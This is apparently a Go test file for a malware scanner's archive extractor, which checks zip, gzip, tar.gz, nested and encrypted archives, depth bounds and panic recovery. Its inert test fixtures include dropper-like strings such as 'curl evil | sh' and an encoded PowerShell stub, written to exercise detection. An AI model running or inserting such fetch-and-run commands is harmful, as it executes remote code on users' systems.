package extract

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"os"
	"path/filepath"
	"testing"
	"time"
)

// TestExtractDeadlineStopsArchive verifies the extraction deadline is honored by
// the archive path (not just fromOLE/fromOOXML): a plain dropper zip with several
// members yields its members under a generous deadline, but an already-expired
// deadline must short-circuit so no members are unpacked. Extraction runs inside
// the held scan-CPU slot, so this bounds wall-clock against a CPU-heavy nested
// decompressor.
func TestExtractDeadlineStopsArchive(t *testing.T) {
	zipBytes := buildZip(t, map[string][]byte{
		"a.js":  bytes.Repeat([]byte("payload-a;"), 64),
		"b.bat": bytes.Repeat([]byte("payload-b;"), 64),
		"c.vbs": bytes.Repeat([]byte("payload-c;"), 64),
	})

	// Generous deadline: members are unpacked.
	ok := Extract(zipBytes, time.Now().Add(10*time.Second))
	if len(ok.Streams) == 0 {
		t.Fatal("with a live deadline the plain zip members should be unpacked")
	}

	// Already-expired deadline: the archive walk must skip everything.
	past := Extract(zipBytes, time.Now().Add(-time.Second))
	if len(past.Streams) != 0 {
		t.Errorf("expired deadline: archive members still unpacked: %d streams", len(past.Streams))
	}
}

// TestExtractArchiveOfficeMemberNotPartDumped is the FP guard: a nested zip that
// is an Office document (OOXML markers) dropped inside a plain archive must go
// through the macro path only — its ordinary body parts (document.xml, …) must
// NOT be surfaced as member streams (that would scan normal text and FP). A
// macro-free .docx therefore contributes zero streams from inside the archive,
// unlike a plain zip member which IS dumped.
func TestExtractArchiveOfficeMemberNotPartDumped(t *testing.T) {
	docx := buildZip(t, map[string][]byte{
		"[Content_Types].xml": []byte(`<?xml version="1.0"?><Types/>`),
		"word/document.xml":   []byte("UNIQUE_BODY_TEXT_should_not_be_scanned_as_a_member"),
		"_rels/.rels":         []byte("<Relationships/>"),
	})
	outer := buildZip(t, map[string][]byte{"report.docx": docx})

	res := Extract(outer, time.Time{})
	for i, s := range res.Streams {
		if bytes.Contains(s, []byte("UNIQUE_BODY_TEXT_should_not_be_scanned_as_a_member")) {
			t.Fatalf("office-doc body part %d was part-dumped from the archive (FP guard broken)", i)
		}
	}
}

// buildZip builds an in-memory zip from name→data entries.
func buildZip(t *testing.T, entries map[string][]byte) []byte {
	t.Helper()
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	for name, data := range entries {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write(data); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// buildGzip gzip-wraps one blob.
func buildGzip(t *testing.T, data []byte) []byte {
	t.Helper()
	var b bytes.Buffer
	gw := gzip.NewWriter(&b)
	if _, err := gw.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := gw.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// buildTarGz builds a gzip-compressed tar from name→data entries.
func buildTarGz(t *testing.T, entries map[string][]byte) []byte {
	t.Helper()
	var tb bytes.Buffer
	tw := tar.NewWriter(&tb)
	for name, data := range entries {
		if err := tw.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(data)), Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write(data); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	return buildGzip(t, tb.Bytes())
}

// buildEncryptedZip builds a zip whose single member has the general-purpose
// "encrypted" flag (bit 0) set. The body is written in the clear (Go's zip
// writer has no encryptor), which is fine: yarad detects the flag and skips the
// member BEFORE any Open/decrypt, so this faithfully exercises the detection
// path without needing a real cipher.
func buildEncryptedZip(t *testing.T, name string, data []byte) []byte {
	t.Helper()
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	w, err := zw.CreateHeader(&zip.FileHeader{Name: name, Method: zip.Store, Flags: 0x1})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := w.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// A password-protected zip member must emit the ARCHIVE-ENCRYPTED marker (a
// hidden-payload mail tell) and must NOT surface the encrypted bytes as content.
func TestExtractEncryptedZipFlagged(t *testing.T) {
	buf := buildEncryptedZip(t, "secret.exe", []byte("MZ encrypted dropper body"))
	res := Extract(buf, time.Time{})
	if !res.EncryptedArchive {
		t.Error("encrypted zip member did not set EncryptedArchive")
	}
	if !streamsContain(res, "ARCHIVE-ENCRYPTED") {
		t.Error("encrypted zip did not emit ARCHIVE-ENCRYPTED marker")
	}
	if streamsContain(res, "encrypted dropper body") {
		t.Error("encrypted member body was surfaced (cannot be — no password)")
	}
}

// A clean (unencrypted) zip must NOT be flagged or marked.
func TestExtractCleanZipNotFlaggedEncrypted(t *testing.T) {
	buf := buildZip(t, map[string][]byte{"ok.txt": []byte("plain member body")})
	res := Extract(buf, time.Time{})
	if res.EncryptedArchive {
		t.Error("clean zip falsely flagged EncryptedArchive")
	}
	if streamsContain(res, "ARCHIVE-ENCRYPTED") {
		t.Error("clean zip falsely emitted ARCHIVE-ENCRYPTED marker")
	}
}

// The marker is emitted at most once even across multiple encrypted members /
// nested archives, so it stays a signal rather than per-member noise.
func TestExtractEncryptedMarkerEmittedOnce(t *testing.T) {
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	for _, n := range []string{"a.exe", "b.exe", "c.exe"} {
		w, err := zw.CreateHeader(&zip.FileHeader{Name: n, Method: zip.Store, Flags: 0x1})
		if err != nil {
			t.Fatal(err)
		}
		_, _ = w.Write([]byte("body"))
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	res := Extract(b.Bytes(), time.Time{})
	n := 0
	for _, s := range res.Streams {
		if string(s) == "ARCHIVE-ENCRYPTED" {
			n++
		}
	}
	for _, s := range res.Markers {
		if string(s) == "ARCHIVE-ENCRYPTED" {
			n++
		}
	}
	if n != 1 {
		t.Errorf("ARCHIVE-ENCRYPTED emitted %d times, want exactly 1", n)
	}
}

// streamsContain searches the union of what the scanner scans: real content
// (res.Streams) plus the out-of-band marker channel (res.Markers, PLAN Phase 1).
func streamsContain(res Result, needle string) bool {
	for _, s := range res.Streams {
		if bytes.Contains(s, []byte(needle)) {
			return true
		}
	}
	for _, s := range res.Markers {
		if bytes.Contains(s, []byte(needle)) {
			return true
		}
	}
	return false
}

// A plain (non-OOXML) zip's file members must be surfaced for scanning.
func TestExtractZipMembers(t *testing.T) {
	buf := buildZip(t, map[string][]byte{
		"dropper.js": []byte("var x = new ActiveXObject('WScript.Shell'); dropper payload"),
		"readme.txt": []byte("nothing to see"),
	})
	res := Extract(buf, time.Time{})
	if !res.IsArchive {
		t.Fatal("zip not flagged IsArchive")
	}
	if !streamsContain(res, "dropper payload") {
		t.Errorf("zip member not surfaced; got %d streams", len(res.Streams))
	}
}

// A gzip-wrapped script must be decompressed and surfaced.
func TestExtractGzip(t *testing.T) {
	buf := buildGzip(t, []byte("powershell -enc ... gzip dropper payload"))
	res := Extract(buf, time.Time{})
	if !res.IsArchive {
		t.Fatal("gzip not flagged IsArchive")
	}
	if !streamsContain(res, "gzip dropper payload") {
		t.Errorf("gzip content not surfaced; got %d streams", len(res.Streams))
	}
}

// A .tar.gz must have its tar members walked, not emitted as one tar blob.
func TestExtractTarGz(t *testing.T) {
	buf := buildTarGz(t, map[string][]byte{
		"bin/evil.sh": []byte("#!/bin/sh\ncurl evil | sh   targz dropper payload"),
	})
	res := Extract(buf, time.Time{})
	if !res.IsArchive {
		t.Fatal("tar.gz not flagged IsArchive")
	}
	if !streamsContain(res, "targz dropper payload") {
		t.Errorf("tar member not surfaced; got %d streams", len(res.Streams))
	}
}

// A nested archive (zip inside zip) must be recursed into so the inner payload
// is reached.
func TestExtractNestedZip(t *testing.T) {
	inner := buildZip(t, map[string][]byte{"inner.exe": []byte("MZ deeply nested payload")})
	outer := buildZip(t, map[string][]byte{"inner.zip": inner})
	res := Extract(outer, time.Time{})
	if !streamsContain(res, "deeply nested payload") {
		t.Errorf("nested zip payload not reached; got %d streams", len(res.Streams))
	}
}

// A gzip wrapping a zip must recurse: gz → zip → member.
func TestExtractGzippedZip(t *testing.T) {
	inner := buildZip(t, map[string][]byte{"x.bat": []byte("@echo off  gz-of-zip dropper payload")})
	buf := buildGzip(t, inner)
	res := Extract(buf, time.Time{})
	if !streamsContain(res, "gz-of-zip dropper payload") {
		t.Errorf("gz-of-zip payload not reached; got %d streams", len(res.Streams))
	}
}

// Recursion depth must be bounded: a deeply nested zip quine must not be
// unpacked past maxArchiveDepth, and must never panic or hang.
func TestExtractArchiveDepthBounded(t *testing.T) {
	buf := buildZip(t, map[string][]byte{"leaf": []byte("leaf payload")})
	// Wrap well past maxArchiveDepth.
	for i := 0; i < maxArchiveDepth+4; i++ {
		buf = buildZip(t, map[string][]byte{"next.zip": buf})
	}
	res := Extract(buf, time.Time{})
	if res.Panicked {
		t.Fatal("deep nesting panicked")
	}
	// The leaf is below maxArchiveDepth, so it must NOT be reached.
	if streamsContain(res, "leaf payload") {
		t.Error("recursion exceeded maxArchiveDepth (leaf reached)")
	}
}

// A real 7z fixture (testdata/payload.7z) must be decompressed and its member
// surfaced.
func TestExtract7z(t *testing.T) {
	buf, err := os.ReadFile(filepath.Join("testdata", "payload.7z"))
	if err != nil {
		t.Skipf("7z fixture missing: %v", err)
	}
	res := Extract(buf, time.Time{})
	if !res.IsArchive {
		t.Fatal("7z not flagged IsArchive")
	}
	if !streamsContain(res, "nested archive payload") {
		t.Errorf("7z member not surfaced; got %d streams", len(res.Streams))
	}
}

// A real RAR fixture (testdata/payload.rar) must be decompressed and its member
// surfaced.
func TestExtractRar(t *testing.T) {
	buf, err := os.ReadFile(filepath.Join("testdata", "payload.rar"))
	if err != nil {
		t.Skipf("rar fixture missing: %v", err)
	}
	res := Extract(buf, time.Time{})
	if !res.IsArchive {
		t.Fatal("rar not flagged IsArchive")
	}
	if !streamsContain(res, "nested archive payload") {
		t.Errorf("rar member not surfaced; got %d streams", len(res.Streams))
	}
}

// Garbage that merely starts with an archive magic must fail open (no panic, no
// crash), emitting nothing.
func TestExtractArchiveGarbage(t *testing.T) {
	for _, magic := range [][]byte{gzipMagic, sevenZMagic, rarMagic} {
		buf := append(append([]byte(nil), magic...), bytes.Repeat([]byte{0x41}, 200)...)
		res := Extract(buf, time.Time{})
		if res.Panicked {
			t.Errorf("garbage with magic %x panicked", magic)
		}
	}
}

// A non-archive buffer must not be flagged IsArchive.
func TestExtractNotArchive(t *testing.T) {
	res := Extract([]byte("just plain text, no archive magic here"), time.Time{})
	if res.IsArchive {
		t.Error("plain text wrongly flagged IsArchive")
	}
}

// TestEmitMemberPanicRecovery verifies that emitMember does not propagate a panic
// on hostile data. A blob that begins with OLE magic but is otherwise garbage may
// drive oleparse to panic inside extractChild; the defer/recover guard must catch
// it and mark res.Panicked without losing already-written streams.
func TestEmitMemberPanicRecovery(t *testing.T) {
	// Prepend a sentinel stream so we can verify partial results are preserved.
	sentinel := []byte("sentinel-stream")
	res := &Result{Streams: [][]byte{sentinel}}
	bud := &archiveBudget{}
	hostile := append(append([]byte{}, oleMagic...), bytes.Repeat([]byte{0xFF}, 4096)...)
	// Must not panic.
	emitMember(hostile, res, bud, 0, time.Time{})
	if len(res.Streams) == 0 || !bytes.Equal(res.Streams[0], sentinel) {
		t.Error("partial streams before the panic should be preserved")
	}
}
